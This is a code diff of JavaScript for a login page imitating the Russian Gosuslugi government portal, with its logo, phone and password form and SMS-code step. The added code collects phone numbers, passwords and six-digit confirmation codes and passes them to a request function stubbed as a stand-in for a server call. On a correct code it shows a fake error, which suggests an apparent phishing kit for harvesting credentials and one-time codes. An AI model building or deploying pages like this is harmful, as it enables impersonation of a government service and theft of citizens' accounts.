@@ -5,8 +5,8 @@ if(typeof GSspace !== "undefined"){
 	const svgFile3 = "<svg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 194 213' enable-background='new 0 0 194 213' xml:space='preserve'><g id='Layer_10'></g><g id='Layer_9'></g><g id='Layer_8'></g><g id='Layer_7'></g><g id='Layer_6'></g><g id='Layer_5'></g><g id='Layer_4'></g><g id='Layer_3'></g><g id='Layer_2'></g><g id='Слой_1'><g id='Layer_11'><g><path fill='#EF3E58' d='M162.8,108.7h-6.4c-0.2,0-0.4,0.2-0.4,0.4v20.3c-1.4,0.4-2.8,0.6-4.4,0.6c-4.2,0-5.2-1.3-5.2-6.9v-14c0-0.2-0.2-0.4-0.4-0.4h-6.4c-0.2,0-0.4,0.2-0.4,0.4v14.7c0,9.2,3.1,12.7,11,12.7c4.5,0,9.6-1.2,12.6-2.3c0.1-0.1,0.2-0.2,0.2-0.3v-24.8C163.2,108.9,163,108.7,162.8,108.7z'></path><path fill='#EF3E58' d='M27.2,108.8h-6.5c-0.2,0-0.3,0.1-0.3,0.3c-1,4-3.1,10.8-5.9,17.9L8,109c-0.1-0.1-0.2-0.2-0.3-0.2H1.1c-0.1,0-0.2,0.1-0.3,0.2c-0.1,0.1-0.1,0.2,0,0.3l9.8,26.8c-1,2.1-1.9,3.8-2.8,5.4c-0.7,1.2-1.3,2.4-1.9,3.7c-0.1,0.1-0.1,0.2,0,0.3c0.1,0.1,0.2,0.2,0.3,0.2h7.1c0.1,0,0.3-0.1,0.3-0.2c1.2-2.3,2.7-5.5,4.1-8.8c4.2-9.8,7.5-19,10-27.4c0-0.1,0-0.2-0.1-0.3C27.4,108.8,27.3,108.8,27.2,108.8z'></path><path fill='#EF3E58' d='M50.5,129.4c0-0.1-0.1-0.2-0.2-0.2c-0.1,0-0.2,0-0.3,0c-1.6,0.6-4.5,1-6.5,1c-4.5,0-6.6-1.2-6.6-8c0-5.5,0.7-8,6.6-8c1.7,0,3.2,0.2,5.2,0.8c0.2,0,0.3,0,0.4-0.2c0.7-1.4,1.6-3.1,2.6-5.2c0-0.1,0-0.2,0-0.3c0-0.1-0.1-0.2-0.2-0.2c-2.6-0.8-5.7-1.3-8.5-1.3c-9.3,0-13.5,4.4-13.5,14.3c0,10,4.2,14.5,13.5,14.5c2.3,0,7-0.5,9.2-1.4c0.2-0.1,0.3-0.3,0.2-0.5L50.5,129.4z'></path><path fill='#EF3E58' d='M111.4,108.8h-6.5c-0.2,0-0.3,0.1-0.3,0.3c-1,4.1-3.1,10.8-5.9,17.9L92.2,109c-0.1-0.1-0.2-0.2-0.3-0.2h-6.6c-0.1,0-0.2,0.1-0.3,0.2c-0.1,0.1-0.1,0.2,0,0.3l9.8,26.8c-1,2.1-1.9,3.8-2.8,5.4c-0.7,1.2-1.3,2.4-1.9,3.7c-0.1,0.1-0.1,0.2,0,0.3c0.1,0.1,0.2,0.2,0.3,0.2h7.1c0.1,0,0.3-0.1,0.3-0.2c1.2-2.3,2.7-5.5,4.1-8.8c4.1-9.8,7.5-19,10-27.4c0-0.1,0-0.2-0.1-0.3C111.6,108.8,111.5,108.8,111.4,108.8z'></path><path fill='#EF3E58' d='M135.4,108.7h-18.9c-0.2,0-0.4,0.2-0.4,0.4v26.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4V115h9.9c0.1,0,0.3-0.1,0.3-0.2c0.8-1.8,1.5-3.7,2.3-5.6c0-0.1,0-0.2,0-0.3C135.6,108.8,135.5,108.7,135.4,108.7z'></path><path fill='#0F67B1' d='M34.8,68.3c-9.2,0-12.8,4-12.8,14.1c0,10.3,3.6,14.3,12.8,14.3c9.3,0,12.9-4,12.9-14.3C47.7,72.3,44.1,68.3,34.8,68.3z M34.8,90.9c-4.2,0-5.5-1.1-5.5-8.3c0-7.6,1.4-8.3,5.5-8.3c4.2,0,5.6,0.7,5.6,8.3C40.4,89.7,39.1,90.9,34.8,90.9z'></path><path fill='#0F67B1' d='M73.3,89.8c0-0.1-0.1-0.2-0.2-0.2c-0.1,0-0.2,0-0.3,0c-1.6,0.6-4.5,1-6.5,1c-4.5,0-6.6-1.2-6.6-8c0-5.5,0.6-8,6.6-8c1.7,0,3.2,0.2,5.2,0.8c0.2,0,0.3,0,0.4-0.2c0.7-1.4,1.6-3.1,2.6-5.2c0-0.1,0-0.2,0-0.3c0-0.1-0.1-0.2-0.2-0.2c-2.6-0.8-5.7-1.3-8.5-1.3c-9.3,0-13.5,4.4-13.5,14.3c0,10,4.2,14.5,13.5,14.5c2.3,0,7-0.5,9.2-1.4c0.2-0.1,0.3-0.3,0.2-0.5L73.3,89.8z'></path><path fill='#0F67B1' d='M1.1,69.1c-0.2,0-0.4,0.2-0.4,0.4v26.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4V75.4h9.9c0.1,0,0.3-0.1,0.3-0.2c0.8-1.8,1.5-3.7,2.3-5.6c0-0.1,0-0.2,0-0.3c-0.1-0.1-0.2-0.2-0.3-0.2H1.1z'></path><linearGradient id='SVGID_1_' gradientUnits='userSpaceOnUse' x1='100.5167' y1='213.0138' x2='100.5167' y2='0.9307' gradientTransform='matrix(1 0 0 -1 0 213.8898)'><stop offset='0.3979' style='stop-color:#1466AC'></stop><stop offset='0.6586' style='stop-color:#EF4058'></stop></linearGradient><path fill-rule='evenodd' clip-rule='evenodd' fill='url(#SVGID_1_)' d='M192.7,133c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0.1-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2c0-3.9-0.1-7.7-0.2-11.2c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5-0.1-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.7-8.1-6.2-17-11.8-23.7c-2.2-2.6-4.5-4.9-6.9-6.7c-0.2-0.2-3-2.2-7.4-5.3c-5.1-3.5-12.4-8.4-20.7-13.2c-14.7-8.7-27.9-14.7-29.6-15.5c0,0,0,0,0,0c0,0,0,0,0,0c-0.1,0-0.1-0.1-0.1-0.1l0,0c0,0,0,0,0,0c-3.9-1.7-8.6-2.9-13.7-3.4c-1-0.1-2-0.2-3-0.2c-0.9,0-1.8-0.1-2.7-0.1c-0.5,0-0.9,0-1.4,0C87.2,1,80.9,2.3,75.9,4.6c0,0,0,0,0,0C75.1,4.9,61.8,11,46.7,19.8h0c-0.2,0.1-0.4,0.2-0.6,0.3C30.7,29.3,18.5,38.3,18,38.7c-3.8,2.8-7.2,6.4-10.3,11C7,50.8,7,53.4,10,53.4h7.7c3.3,0,4.1-2,7.8-4.7c4.1-3,12.2-9,27-17.8C63.2,24.6,73.2,19.7,78,17.4c0,0,0,0,0,0c0.1,0,0.2-0.1,0.3-0.1c0,0,0.1,0,0.1-0.1c0,0,0.1,0,0.1-0.1c0.1,0,0.2-0.1,0.2-0.1c0,0,0,0,0,0c0.1,0,0.2-0.1,0.3-0.1c0,0,0,0,0,0c1.2-0.6,2-0.9,2-0.9c3.4-1.5,8.2-2.5,13.3-2.6c0.3,0,0.7,0,1,0c0.3,0,0.7,0,1,0c1.5,0,3,0.1,4.4,0.3c3.1,0.4,5.9,1,8.2,2c0.2,0.1,0.5,0.2,0.7,0.3c0,0,0.1,0.1,0.4,0.2c2.3,1,14.7,6.9,28.2,14.8c8,4.7,15.1,9.4,20,12.8c4.3,3,6.9,4.9,7,5c1.9,1.4,3.8,3.4,5.6,5.6c4.5,5.8,8.2,13.7,8.8,19.8c0,0.1,0.3,2.5,0.6,6.6c0,0.3,0,0.5,0.1,0.8c0,0.2,0,0.4,0,0.6c0,0.4,0.1,0.7,0.1,1.1c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0.1,0.7c0,0.5,0.1,1,0.1,1.5c0,0.3,0,0.6,0.1,0.9c0,0.1,0,0.2,0,0.2c0,0.4,0,0.7,0.1,1.1c0,0.3,0,0.5,0,0.8c0.3,5.2,0.5,11.4,0.5,17.9s-0.2,12.7-0.5,17.9c0,0.3,0,0.5,0,0.8c0,0.4,0,0.7-0.1,1.1c0,0.1,0,0.2,0,0.2c0,0.3,0,0.6-0.1,0.9c0,0.5-0.1,1-0.1,1.5c0,0.3,0,0.5-0.1,0.7c0,0.1,0,0.3,0,0.4c0,0.4-0.1,0.7-0.1,1.1c0,0.2,0,0.4,0,0.6c0,0.3,0,0.6-0.1,0.8c-0.3,4.1-0.6,6.6-0.6,6.6c-0.6,6.1-4.3,14-8.8,19.8c-1.8,2.3-3.7,4.2-5.6,5.6c-0.1,0-2.7,2-7,5c-4.9,3.4-12.1,8.1-20,12.8c-13.5,8-26,13.8-28.2,14.8c-0.2,0.1-0.4,0.2-0.4,0.2c-0.2,0.1-0.5,0.2-0.7,0.3c-2.3,0.9-5.1,1.6-8.2,2c-1.4,0.2-2.9,0.3-4.4,0.3c-0.3,0-0.7,0-1,0s-0.7,0-1,0c-5.1-0.1-9.9-1-13.3-2.6c0,0-0.7-0.3-2-0.9c0,0,0,0,0,0c-0.1-0.1-0.3-0.1-0.4-0.2c0,0,0,0,0,0c-0.1-0.1-0.2-0.1-0.3-0.2c-0.1,0-0.1-0.1-0.2-0.1c-0.1,0-0.2-0.1-0.3-0.1c-0.1-0.1-0.2-0.1-0.4-0.2c0,0-0.1,0-0.1,0c-5.1-2.4-14.7-7.2-24.9-13.2c-14.9-8.7-22.9-14.8-27-17.8c-3.7-2.7-4.5-4.7-7.8-4.7H10c-3,0-3,2.6-2.3,3.6c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c4.9,2.2,11.3,3.5,18.1,3.7c0.4,0,0.9,0,1.4,0c0.9,0,1.8,0,2.7-0.1c1,0,2-0.1,3-0.2c5.1-0.5,9.9-1.7,13.7-3.4c0,0,0,0,0,0l0,0c0,0,0.1,0,0.1-0.1c0,0,0,0,0,0c0,0,0,0,0,0c1.7-0.8,14.9-6.9,29.6-15.5c8.3-4.9,15.6-9.7,20.7-13.2c4.4-3.1,7.2-5.1,7.4-5.3c2.4-1.8,4.7-4.1,6.9-6.7c5.6-6.7,10.1-15.6,11.8-23.7c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4C192.7,133.7,192.7,133.3,192.7,133'></path><path fill='#EF3E58' d='M79.9,108.7H60.3c-0.2,0-0.3,0.1-0.4,0.3c-0.5,8.9-2.2,18.4-4.6,26.2c0,0.1,0,0.2,0.1,0.3c0.1,0.1,0.2,0.1,0.3,0.1h6.7c0.2,0,0.3-0.1,0.3-0.2c1.9-6,3.4-13.8,4-20.4h6.4v20.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4v-26.3C80.3,108.9,80.1,108.7,79.9,108.7z'></path></g></g></g></svg>";
 	const firstForm = "<div id='placement' class='fl cl'><div id='headerPage' class='fl sb'><div class='headIcon'><img src='./img/max.png' id='maxGpt'></div><div class='headIcon'><img src='./img/gosscan.png' id='gosScan'></div></div><div id='centralLogo'><img src='./img/logo.png'></div><div id='footerPage'><div><button id='signInButt'>Войти</button></div><div><button id='signUpButt'>Зарегистрироваться</button></div></div></div>";
 	const secondForm = "<div id='realLogin' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl'><div id='rusTag'>Русский</div><div id='rusFlag'><img src='./img/rusFlag.png'></div></div><div id='loginPlace'><div class='strokaInput'><div class='headInput'>Телефон </div><input type='tel' id='login' placeholder='Телефон ' autocomplete='off'></div></div><div id='passPlace'><div class='strokaInput'><div class='headInput'>Пароль </div><input type='password' id='password' placeholder='Пароль ' autocomplete='off'></div></div><div id=''><div class='strokaInput'><div id='resText'>Восстановить</div></div></div><div id=''><div class='strokaInput'><button id='signInButt'>Войти</button></div></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не удается войти?</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a>Зарегистрироваться</a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
-	const thirdForm = "<div class='fl cs'><div id='dopHeader'><div id='preHeaderTitul'>Идёт загрузка...</div></div><div id='progressBar'><div id='progressLine'></div></div><div id='progressLogoBar'><div id='preLogoTitul'><img src='./img/logo2.jpg'></div></div><div id='dopBody'><div id='preMess' class='fl'><div id='preMessForm'><div id='sysMessTitul' class='stroka'>Госуслуги сейчас откроются</div><div id='sysMessText' class='stroka'>Портал работает в прежднем режиме. Подождите пару секунд.</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div></div></div></div>";
-	const fourthForm = "<div id='tempCode' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='backSUpBut'><img src='./img/arrBackS.png'></div><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl ac'><div id='trustTitul'>Подтвердите вход </div><div id='messTrust'></div><div id='telTrust'></div></div><div id=''><div id='titulCode'><div>Код подтверждения</div></div></div><div id='loginPlace'><div class='strokaInput fl'><input type='text' class='tCode tact' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'></div></div><div id='tTimerReq'></div><div id='tTimerVal'></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не могу подтвердить вход</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a></a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
+	const thirdForm = "<div class='fl cs'><div id='dopHeader'><div id='preHeaderTitul'>Идёт загрузка...</div></div><div id='progressBar'><div id='progressLine'></div></div><div id='progressLogoBar'><div id='preLogoTitul'><img src='./img/logo2.jpg'></div></div><div id='dopBody'><div id='preMess' class='fl'><div id='preMessForm'><div id='sysMessTitul' class='stroka'>Госуслуги сейчас откроются</div><div id='sysMessText' class='stroka'>Портал работает в прежднем режиме. Подождите пару секунд.</div><div id='sysMessLoader'><img src='./img/loader.gif'></div></div></div></div></div></div>";
+	const fourthForm = "<div id='tempCode' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div></div><div id='dopBody'><div id='bodyBubble'><div id='backSUpBut'><img src='./img/arrBackS.png'></div><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl ac'><div id='trustTitul'>Подтвердите вход </div><div id='messTrust'></div><div id='telTrust'></div></div><div id=''><div id='titulCode'><div>Код подтверждения</div></div></div><div id='loginPlace'><div class='strokaInput fl'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='1'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='2'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='3'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='4'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='5'><input type='number' class='tCode' placeholder='' autocomplete='off' -id='6'></div></div><div id='tTimerReq'></div><div id='tTimerVal'></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не могу подтвердить вход</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a></a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
 	//Телефон / Email / СНИЛС
 
 	function loadingSpace(){//главная функция, при загрузке страницы
@@ -91,7 +91,7 @@ if(typeof GSspace !== "undefined"){
 		}
 		if(inputBackButtLink){
 			inputBackButtLink.addEventListener(typeTap, () => {backToTitulPage()});
-		}		
+		}
 	}
 	function backToTitulPage(){//функция возврата на титульную страницу
 		var pageNow = document.querySelector("#realLogin");//форму которую надо задвинуть вправо
@@ -104,47 +104,88 @@ if(typeof GSspace !== "undefined"){
 	}
 	function authorisation(e,k){//авторизация
 		if(e.value != '' && k.value != ''){
-			console.log(e.value + " | "+ k.value);
-			//проверка логина на валидность | длинна логина, убрать запрещенные символы, оставить только текст
-			//отправка лог&пасс на сервер
-			var loginFormPlace = document.querySelector("#mainPlace");
-			loginFormPlace.insertAdjacentHTML("beforeend", fourthForm);
-			document.querySelector("#trustTitul").insertAdjacentText("beforeend", "по смс");
-			document.querySelector("#messTrust").insertAdjacentText("beforeend", "Код подтверждения отправлен на номер");
-			document.querySelector("#telTrust").textContent = e.value; //+7 951 ***-**-15
-			
-			reloadTimerforSendData();
-			pinKodeGen();
+			if(e.value.length < 12){
+				e.value = "", k.value = "";
+				aMessages("Ошибка!","Введен некоректный номер телефона. Повторите попытку еще раз.",2);
+			}else if(e.value.length == 12 && e.value.slice(0, 2) == "+7" && e.value.slice(2, 3) == "9"){
+				sRequest("auth", [e.value,k.value]);				
+			}else{
+				aMessages("Ошибка!","Введены некоректные данные. Повторите попытку еще раз.",2);
+			}			
 		}else{
 			console.log("незаполнены поля");
 			aMessages("Ошибка!","Не заполнены одно или оба обязательных поля. Повторите попытку еще раз.",2);
 		}
 	}
-	function reloadTimerforSendData(){//перезапуск timer
+	function reloadTimerforSendData(login,pass){//перезапуск timer
 		if(document.querySelector("#timerReload")){
 			document.querySelector("#timerReload").remove();
 		}
-		document.querySelector("#tTimerReq").insertAdjacentHTML("afterbegin", "<div id='tCodeTrust'>Отправить повторно через</div>");
-		document.querySelector("#tTimerVal").insertAdjacentHTML("afterbegin", "<div id='tTimer'>00:59</div>");
+		if(document.querySelector("#tTimerReq")){
+			document.querySelector("#tTimerReq").insertAdjacentHTML("afterbegin", "<div id='tCodeTrust'>Отправить повторно через</div>");
+			document.querySelector("#tTimerVal").insertAdjacentHTML("afterbegin", "<div id='tTimer'>00:59</div>");
+		}
 
-		var count = 58, timer = setInterval(function(){
+		var count = 18, timer = setInterval(function(){
 			var tik = count--;
 			if(tik.toString().length < 2){
 				tik = "0"+tik;
 			}				
-			var timerVal = document.querySelector("#tTimer").textContent = "00:"+tik;
+			var timerVal = document.querySelector("#tTimer");
+			if(timerVal){
+				timerVal.textContent = "00:"+tik;
+			}
+			else{
+				clearInterval(timer);
+			}			
 			if(count == 0){
 				clearInterval(timer);
 				document.querySelector("#tTimer").remove();
 				document.querySelector("#tCodeTrust").innerHTML = "";
 				document.querySelector("#tCodeTrust").insertAdjacentHTML("afterbegin", "<a id='timerReload'>Отправить повторно</a>");
-				document.querySelector("#timerReload").addEventListener(typeTap, (e) => reloadTimerforSendData());
+				//document.querySelector("#timerReload").addEventListener(typeTap, (e) => reloadTimerforSendData());
+				document.querySelector("#timerReload").addEventListener(typeTap, (e) => sRequest("auth", [login,pass]));
 			}				
 			
-		}, 1000);	
+		}, 1000);					
 	}
 	function pinKodeGen(){//функция обработки пинкода, его ввода и стилистические изменения
+		var inputNumber = document.querySelectorAll(".tCode");
+		inputNumber.forEach(elem => {
+			elem.addEventListener(typeTap, (e) => activatePole(e));			
+			elem.addEventListener("input", (e) => enterSecretCode(e));			
+		});
 		
+		function activatePole(e){
+			if(e.target.classList.contains("-focus") == false){
+				var activBlockYet = document.querySelector(".-focus");
+				if(activBlockYet){
+					activBlockYet.classList.remove("-focus");
+				}				
+				e.target.classList.add("-focus");
+				e.target.focus();			
+				e.target.value = "";			
+			}
+		}
+		function enterSecretCode(e){
+			var nomerPole = e.target.getAttribute("-id");
+			var digits = e.target.value.replace(/\D/g, '');
+			if(digits.length > 1) {
+				e.target.value = digits[0];
+			}else{
+				var activBlockYet = document.querySelector(`[-id="${Number(nomerPole) + 1}"]`);
+				if(activBlockYet){
+					e.target.classList.remove("-focus");
+					activBlockYet.classList.add("-focus");
+					activBlockYet.focus();
+					activBlockYet.value = "";
+				}else{
+					if(document.querySelector("[-id='1']").value != "" && document.querySelector("[-id='2']").value != "" && document.querySelector("[-id='3']").value != "" && document.querySelector("[-id='4']").value != "" && document.querySelector("[-id='5']").value != "" && document.querySelector("[-id='6']").value != ""){
+						finalLogingFunc(document.querySelector("[-id='1']").value,document.querySelector("[-id='2']").value,document.querySelector("[-id='3']").value,document.querySelector("[-id='4']").value,document.querySelector("[-id='5']").value,document.querySelector("[-id='6']").value);						
+					}					
+				}
+			}
+		}
 	}
 	function loadRegForm(){//выскакивающий подвал пререгистрации
 		var regPreFormPlace = document.querySelector("#mainPlace");
@@ -324,14 +365,80 @@ if(typeof GSspace !== "undefined"){
 		var aMessageForm = document.querySelector("#sysMess");
 		if(!aMessageForm){
 			if(aMtimer != 0){
-				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div>`);
+				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.gif'></div></div></div>`);
 				aMtimer = aMtimer*1000;
 				setTimeout(() => {document.querySelector('#sysMess').remove();}, aMtimer);	
 			}else{
-				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div>`);
+				document.body.insertAdjacentHTML('afterbegin',`<div id='sysMess' class='fl cc'><div id='sysMessForm'><div id='sysMessTitul' class='stroka'>${aMtitle}</div><div id='sysMessText' class='stroka'>${aMbody}</div><div id='sysMessLoader'><img src='./img/loader.gif'></div></div></div>`);
 			}
 		}
 	}
-
+	function maskPhoneNumber(phone){//форматируем номер телефона в скрытый формат
+		const digits = phone.replace(/\D/g, '');
+		if(digits.length !== 11){
+			return 'Некорректный номер';
+		}
+		return `+7 ${digits[1]}${digits[2]}${digits[3]} ***-**-${digits[9]}${digits[10]}`;
+	}
+	function sRequest(type,data){//отправка на сервер логина и пароля
+		switch(type){
+			case "auth":
+				console.log("Отправка запроса на авторизацию: Логин: "+data[0]+" | Пароль: "+data[1]);
+				//запрос fetch
+				//===затычка вместо фетч
+				const trueLogin = "+79517773915";
+				const truePass = "password";
+				
+				if(data[0] == trueLogin && data[1] == truePass){
+					var loginFormPlace = document.querySelector("#mainPlace");
+					if(!document.querySelector("#tempCode")){
+						loginFormPlace.insertAdjacentHTML("beforeend", fourthForm);
+						var backSUpBut = loginFormPlace.querySelector("#backSUpBut");				
+						document.querySelector("#trustTitul").insertAdjacentText("beforeend", "по смс");
+						document.querySelector("#messTrust").insertAdjacentText("beforeend", "Код подтверждения отправлен на номер");
+						document.querySelector("#telTrust").textContent = maskPhoneNumber(data[0]); //замена номера пообразцу - +7 951 ***-**-15
+						
+						backSUpBut.addEventListener(typeTap, (e) => backToLoginForm(e));
+						reloadTimerforSendData(data[0], data[1]);
+						pinKodeGen();
+						
+						function backToLoginForm(){
+							document.querySelector("#tempCode").remove();
+						}
+					}else{
+						var inputNumber = document.querySelectorAll(".tCode");
+						inputNumber.forEach(elem => {
+							elem.value = "";			
+						});
+						reloadTimerforSendData(data[0], data[1]);
+						pinKodeGen();
+					}
+				}else{
+					aMessages("Ошибка!","Введены некоректные данные. Повторите попытку еще раз.",2);
+				}								
+				break;
+			case "singUp":
+				break;
+			case "restore":
+				break;
+			
+		}
+	}
+	function finalLogingFunc(e,k,l,i,o,n){//подтверждение входя секретным кодом
+		console.log(`Secred code: ${e}${k}${l}${i}${o}${n}`);
+		var secredInputCode = Number(`${e}${k}${l}${i}${o}${n}`);
+		const secredCodeTrust = 666666; //ТОЛЬКО для проверки работоспособности
+		//fetch отправка кода
+		//===затычка вместо фетч
+		if(secredInputCode == secredCodeTrust){
+			aMessages("Ошибка!","Произошла непредвиденная ошибка. Повторите попытку позже.",3);
+			document.querySelector("#tempCode").remove();
+		}else{
+			aMessages("Ошибка!","Неверно введен проверочный код. Попробуйте еще раз.",3);
+		}
+		//===
+		
+	}
+	
     loadingSpace();
 }
